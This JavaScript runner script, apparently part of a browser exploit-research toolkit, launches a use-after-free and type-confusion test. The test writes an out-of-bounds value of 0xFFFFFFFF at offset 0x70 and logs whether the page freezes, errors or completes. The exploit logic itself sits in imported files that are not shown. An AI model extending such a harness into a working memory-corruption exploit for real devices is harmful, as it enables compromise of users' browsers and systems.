// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import { executeUAFTypeConfusionTestWithValue } from './testJsonTypeConfusionUAFSpeculative.mjs';
// OOB_CONFIG e KNOWN_STRUCTURE_IDS não são usados diretamente aqui, mas são usados por testJsonTypeConfusionUAFSpeculative.mjs
import { OOB_CONFIG, KNOWN_STRUCTURE_IDS } from '../config.mjs'; 
import { toHex } from '../utils.mjs';

async function runUAFTC_DepthTest_WithValue_FFFF() {
    const FNAME_RUNNER = "runUAFTC_DepthTest_WithValue_FFFF";
    logS3(`==== INICIANDO Teste UAF/TC com Profundidade Variável (Valor OOB 0xFFFFFFFF @ 0x70) ====`, 'test', FNAME_RUNNER);

    const valueForCorruption = 0xFFFFFFFF;
    const testDescription = `DepthTest_OOB_Val_FFFF_Offset0x70`;
    
    logS3(`\n--- Executando Teste UAF/TC: ${testDescription} ---`, 'subtest', FNAME_RUNNER);
    
    let result = await executeUAFTypeConfusionTestWithValue(
        testDescription,
        valueForCorruption
    );

    if (result.potentiallyFroze) {
        logS3(`   RESULTADO ${testDescription}: CONGELAMENTO POTENCIAL. Chamadas toJSON: ${result.calls}`, "error", FNAME_RUNNER);
    } else if (result.errorOccurred) {
        logS3(`   RESULTADO ${testDescription}: ERRO JS CAPTURADO: ${result.errorOccurred.name} - ${result.errorOccurred.message}. Chamadas toJSON: ${result.calls}`, "warn", FNAME_RUNNER);
        if(result.errorOccurred.stack) logS3(`      Stack: ${result.errorOccurred.stack}`, "warn");
    } else {
        logS3(`   RESULTADO ${testDescription}: Completou. Chamadas toJSON: ${result.calls}`, "good", FNAME_RUNNER);
        logS3(`      Stringify Result: ${String(result.stringifyResult).substring(0,200)}`, "info", FNAME_RUNNER);
    }
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`   Título da página após teste ${testDescription}: ${document.title}`, "info");

    logS3(`==== Teste UAF/TC com Profundidade Variável (Valor OOB 0xFFFFFFFF @ 0x70) CONCLUÍDO ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME = 'runAllAdvancedTestsS3_UAFTC_DepthTest_FFFF';
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== INICIANDO Script 3: Teste UAF/TC com Profundidade Variável (Valor OOB 0xFFFFFFFF @ 0x70) ====`,'test', FNAME);
    document.title = "Iniciando Script 3 - UAF/TC Depth Test (0xFFFFFFFF)";
    
    await runUAFTC_DepthTest_WithValue_FFFF();
    
    logS3(`\n==== Script 3 CONCLUÍDO (Teste UAF/TC com Profundidade Variável (0xFFFFFFFF)) ====`,'test', FNAME);
    if (runBtn) runBtn.disabled = false;
    
    // Ajuste final do título
    if (document.title.startsWith("Iniciando") || document.title.includes("ERRO") || document.title.includes("CONGELOU?")) {
        // Manter
    } else {
        document.title = "Script 3 Concluído - UAF/TC Depth Test (0xFFFFFFFF)";
    }
}
